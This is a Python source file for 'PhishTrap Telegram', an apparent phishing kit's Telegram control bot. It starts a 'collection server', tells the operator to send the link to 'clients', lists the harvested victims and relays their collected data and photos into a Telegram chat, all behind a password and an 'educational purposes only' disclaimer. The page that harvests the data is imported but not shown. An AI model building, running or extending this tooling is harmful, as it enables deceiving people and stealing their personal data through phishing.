# =========================================================================================
#
#   PhishTrap Telegram
#
#   Created by: Jutt Cyber Tech
#   GitHub: https://github.com/juttcybertech
#
#   Disclaimer: This tool is for educational purposes and authorized security testing only.
#
# =========================================================================================
import logging
import os
from dotenv import load_dotenv
import threading
import requests
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters


# --- Global Variables ---
flask_thread = None

# --- ANSI Color Codes ---
P = '\033[95m' # Purple
Y = '\033[93m' # Yellow
G = '\033[92m' # Green
C = '\033[96m' # Cyan
W = '\033[97m' # White
RESET = '\033[0m' # Reset

# --- Telegram Bot Configuration ---
load_dotenv() # Load environment variables from .env file
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
PASSWORD = os.getenv("PASSWORD")
SERVER_URL = os.getenv("SERVER_URL") # Load server URL from .env file

# --- Client Counter and Lock ---
print_lock = threading.Lock()
authenticated_users = set() # Stores user IDs that have successfully authenticated

def send_telegram_message(message_text):
    """Sends a text message to the configured Telegram chat."""
    # This check is now in main()

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': CHAT_ID,
        'text': message_text,
        'parse_mode': 'HTML' # Using HTML for better formatting
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"{Y}WARNING: Failed to send Telegram message: {e}{RESET}")

def send_telegram_photo(photo_path, caption):
    """Sends a photo to the configured Telegram chat."""
    # This check is now in main()

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    try:
        with open(photo_path, 'rb') as photo:
            files = {'photo': photo}
            requests.post(url, data={'chat_id': CHAT_ID, 'caption': caption}, files=files, timeout=10)
    except Exception as e:
        print(f"{Y}WARNING: Failed to send Telegram photo: {e}{RESET}")

# --- Telegram Bot Command Handlers ---

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Sends the main menu when the /start command is issued."""
    user_id = update.message.from_user.id
    print(f"\n{Y}DEBUG: /start command received from user {user_id}{RESET}")

    if user_id in authenticated_users:
        print(f"{G}DEBUG: User {user_id} is already authenticated. Sending menu.{RESET}")
        await send_main_menu(update)
    else:
        print(f"{Y}DEBUG: User {user_id} is not authenticated. Requesting password.{RESET}")
        await update.message.reply_text('<b>Please enter the password to continue:</b>', parse_mode='HTML')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles button presses from the inline keyboards."""
    global flask_thread # Moved global declaration to the top of the function
    query = update.callback_query
    user_id = query.from_user.id
    print(f"\n{Y}DEBUG: Button press received from user {user_id}. Data: '{query.data}'{RESET}")
    await query.answer() # Acknowledge the button press

    # --- Security Check ---
    if user_id not in authenticated_users:
        print(f"{Y}WARNING: Unauthorized button press attempt by user {user_id}.{RESET}")
        try:
            await query.edit_message_text(text="❌ Access Denied. Please authenticate with /start first.")
        except Exception as e:
            print(f"{Y}Could not edit message for unauthorized user: {e}{RESET}")
        return

    # --- Back to Main Menu ---
    if query.data == 'main_menu':
        if flask_thread and flask_thread.is_alive():
            server_button = InlineKeyboardButton("📊 Server Status (Running)", callback_data='server_status')
        else:
            server_button = InlineKeyboardButton("🚀 Start Collection Server", callback_data='start_server')
        keyboard = [[InlineKeyboardButton("📊 View Saved Clients", callback_data='view_clients')], [server_button]]
         
        # We must delete the old message and send a new one because we can't edit a text-only message into a photo message.
        await query.message.delete()
        
        github_pfp_url = "https://avatars.githubusercontent.com/u/233218696?v=4"
        github_url = "https://github.com/juttcybertech"
        
        caption_message = (
            "<b>Welcome to PhishTrap Telegram!</b>\n"
            "Please choose an option below.\n\n"
            f"<i>Created By <a href='{github_url}'>Jutt Cyber Tech</a></i>\n\n"
            "⚠️ <b>Disclaimer:</b> This tool is intended for educational purposes and authorized "
            "security testing only. Its goal is to raise awareness about phishing attacks. "
            "The creator is not responsible for any illegal or malicious use."
        )
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_photo(photo=github_pfp_url, caption=caption_message, reply_markup=reply_markup, parse_mode='HTML')
        return
    # --- Start Server Logic ---
    if query.data == 'start_server':
        from web_server import run_server
        if flask_thread and flask_thread.is_alive():
            status_text = "⚠️ The collection server is already running."
            keyboard = [[InlineKeyboardButton("⬅️ Back to Main Menu", callback_data='main_menu')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_caption(caption=status_text, reply_markup=reply_markup)

        def run_flask_app():
            # Disable Flask's default logging to keep terminal clean
            log = logging.getLogger('werkzeug')
            log.setLevel(logging.ERROR)
            run_server()

        flask_thread = threading.Thread(target=run_flask_app)
        flask_thread.daemon = True
        flask_thread.start()
        keyboard = [[InlineKeyboardButton("⬅️ Back to Main Menu", callback_data='main_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_caption(
            caption=f"✅ Collection server has been started.\n\nSend this link to your clients:\n`{SERVER_URL}`",
            reply_markup=reply_markup,
            parse_mode='Markdown') # Using Markdown here for the code block

    # --- Server Status Logic ---
    elif query.data == 'server_status':
        status_text = "✅ The collection server is currently running."
        keyboard = [[InlineKeyboardButton("⬅️ Back to Main Menu", callback_data='main_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_caption(caption=status_text, reply_markup=reply_markup)
        return

    # --- View Clients Logic ---
    elif query.data == 'view_clients':
        base_dir = "data"
        if not os.path.isdir(base_dir):
            await query.edit_message_caption(caption="The 'data' directory does not exist. No saved clients.")
            return
        
        client_dirs = [d for d in os.listdir(base_dir) if os.path.isdir(os.path.join(base_dir, d)) and d.isdigit()]
        if not client_dirs:
            await query.edit_message_caption(caption="No saved clients found.")
            return

        clients = []
        for client_id in client_dirs:
            info_path = os.path.join(base_dir, client_id, "info.txt")
            timestamp = "Unknown Time"
            if os.path.exists(info_path):
                with open(info_path, 'r', encoding='utf-8') as f:
                    first_line = f.readline() # e.g., "CLIENT #1 | 2025-12-03 01:25:36"
                    if '|' in first_line:
                        timestamp = first_line.split('|')[1].strip()
            clients.append({'id': client_id, 'time': timestamp})

        # Sort clients by ID in descending order (newest first)
        clients.sort(key=lambda x: int(x['id']), reverse=True)

        keyboard = []
        for client in clients:
            # Display format: "Client #1 - 2025-12-03 01:25:36"
            keyboard.append([InlineKeyboardButton(f"Client #{client['id']} - {client['time']}", callback_data=f"client_{client['id']}")])
        keyboard.append([InlineKeyboardButton("⬅️ Back to Main Menu", callback_data='main_menu')])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_caption(caption="<b>Select a client to view their data:</b>", reply_markup=reply_markup, parse_mode='HTML')

    # --- View Specific Client Info Logic ---
    elif query.data.startswith('client_'):
        client_id = query.data.split('_')[1]
        file_path = os.path.join("data", client_id, "info.txt")
        
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                info_text = f.read()
            
            # Telegram has a message length limit, so we send a snippet
            # For simplicity, we'll just send the whole thing if it's short
            if len(info_text) > 4000:
                info_text = info_text[:4000] + "\n\n[Message truncated]"

            keyboard = [[InlineKeyboardButton("⬅️ Back to Client List", callback_data='view_clients')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(text=f"<pre>{info_text}</pre>", parse_mode='HTML', reply_markup=reply_markup)
        else:
            await query.edit_message_text(text=f"ERROR: info.txt not found for Client #{client_id}.")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles regular text messages for password authentication."""
    user_id = update.message.from_user.id
    text = update.message.text

    # Ignore if user is already authenticated
    if user_id in authenticated_users:
        await update.message.reply_text("I'm not a chatbot. Please use the menu buttons or /start.")
        return

    # --- Password Check ---
    if text == PASSWORD:
        authenticated_users.add(user_id)
        print(f"{G}SUCCESS: User {user_id} authenticated successfully.{RESET}")
        await update.message.reply_text("✅ Password correct! Access granted.")
        await send_main_menu(update)
    else:
        print(f"{Y}FAILURE: Incorrect password attempt from user {user_id}.{RESET}")
        await update.message.reply_text("❌ Incorrect password. Please try again or use /start.")

async def send_main_menu(update: Update):
    """Sends the main menu keyboard to the user."""
    global flask_thread
    if flask_thread and flask_thread.is_alive():
        server_button = InlineKeyboardButton("📊 Server Status (Running)", callback_data='server_status')
    else:
        server_button = InlineKeyboardButton("🚀 Start Collection Server", callback_data='start_server')

    keyboard = [
        [InlineKeyboardButton("📊 View Saved Clients", callback_data='view_clients')],
        [server_button],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    github_pfp_url = "https://avatars.githubusercontent.com/u/233218696?v=4"
    github_url = "https://github.com/juttcybertech"
    
    caption_message = (
        "<b>Welcome to PhishTrap Telegram!</b>\n"
        "Please choose an option below.\n\n"
        f"<i>Created By <a href='{github_url}'>Jutt Cyber Tech</a></i>\n\n"
        "⚠️ <b>Disclaimer:</b> This tool is intended for educational purposes and authorized "
        "security testing only. Its goal is to raise awareness about phishing attacks. "
        "The creator is not responsible for any illegal or malicious use."
    )
    
    # Send the GitHub profile picture with the welcome message as the caption
    await update.message.reply_photo(photo=github_pfp_url, caption=caption_message, reply_markup=reply_markup, parse_mode='HTML')
    
    print(f"{G}DEBUG: Main menu sent successfully.{RESET}")

def main():
    """Main function to start the bot and wait for commands."""
    if not all([BOT_TOKEN, CHAT_ID, PASSWORD, SERVER_URL]):
        print(f"{Y}FATAL ERROR: Please set BOT_TOKEN, CHAT_ID, PASSWORD, and SERVER_URL in the .env file.{RESET}")
        return

    os.system('cls' if os.name == 'nt' else 'clear')
    
    # --- Startup Banner ---
    line_1 = "   PhishTrap Telegram"
    line_2 = "   Created by: Jutt Cyber Tech"
    print(f"{P}╔{'═' * 60}╗{RESET}")
    print(f"{P}║{G}{line_1:<60}{P}║{RESET}")
    print(f"{P}║{C}{line_2:<60}{P}║{RESET}")
    print(f"{P}╚{'═' * 60}╝{RESET}\n")

    print(f"{G}Bot is running... Send /start to your bot to get the menu.{RESET}")
    print(f"{C}Press CTRL+C to stop the bot.{RESET}")

    # Create the Application and pass it your bot's token.
    application = Application.builder().token(BOT_TOKEN).build()

    # on different commands - answer in Telegram
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Run the bot until the user presses Ctrl-C
    application.run_polling()

if __name__ == '__main__':
    main()